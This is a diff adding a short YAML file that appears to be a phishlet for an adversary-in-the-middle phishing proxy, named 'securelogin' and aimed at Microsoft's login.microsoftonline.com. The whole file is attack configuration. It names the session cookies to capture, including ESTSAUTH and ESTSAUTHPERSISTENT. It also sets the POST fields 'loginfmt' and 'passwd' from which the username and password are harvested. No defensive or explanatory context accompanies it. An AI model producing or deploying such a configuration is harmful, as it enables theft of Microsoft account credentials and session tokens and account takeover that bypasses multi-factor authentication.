@@ -1,0 +1,30 @@
+#microsoft outlook
+name: securelogin
+author: posh-ai
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'login.microsoftonline.com', session: true, is_landing: true}
+
+sub_filters: []
+
+auth_tokens:
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'MSISAuth', 'MSISAuthenticated', '.AspNetCore.Cookies']
+
+auth_urls:
+  - https://login.microsoftonline.com/common/oauth2/authorize
+
+credentials:
+  username:
+    key: 'loginfmt'
+    search: '(.*)'
+    type: post
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: post
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
